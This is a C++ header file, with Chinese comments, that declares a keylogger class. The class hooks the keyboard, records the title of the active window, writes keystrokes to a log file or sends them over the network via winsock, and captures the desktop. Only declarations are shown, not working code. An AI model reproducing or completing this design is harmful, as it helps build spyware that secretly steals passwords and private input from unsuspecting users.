#pragma once
#ifndef KBHOOK_H
#define KBHOOK_H

#include "winsock.h"

#pragma comment(lib,"user32.lib")

#define SAVE_SIZE 40*1024
class _KbHook
{
public:
	_KbHook();
	~_KbHook();

	static DWORD __stdcall CreateWindowThread(LPVOID lpParam);
	void CreateWindowHook();
	static LRESULT CALLBACK HookWindowProc(HWND hWndKeylogger, UINT Msg, WPARAM wParam, LPARAM lParam);

	void SendStartHook(char* fileName, int len);
	void SendStopHook();

	void StartHook();
	void StopHook();

	static LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
	LRESULT KeyboardHookFunc(int nCode, WPARAM wParam, LPARAM lParam);
	void ProcessKeyInfo(char *Buffer);

	BOOL Desktop_Capture(PCHAR lpWinSta, PCHAR lpDesktop, PCHAR lpFile, DWORD m_dwLastError);

private:
	static _KbHook* m_pThis; //静态对象指针

	DWORD m_ThreadID;
	HWND m_hWndKeylogger; //创建的窗口句柄
	HHOOK m_hhook; //钩子变量
	HWND m_hLastFocus; //记录上一次得到焦点的窗口句柄

	HANDLE	m_ThreadHandle;
	bool m_bLogToFile;
	bool m_bSend;
	bool m_bOfflineLog;

	HANDLE m_hCreateWindowEvent; //窗口创建事件

	char m_CurrentWindowText[128];
	char m_LastWindowText[128];

	char m_fileName[MAX_PATH];//保存的log文件名
	HANDLE m_hFile;  //写文件句柄
};

#endif 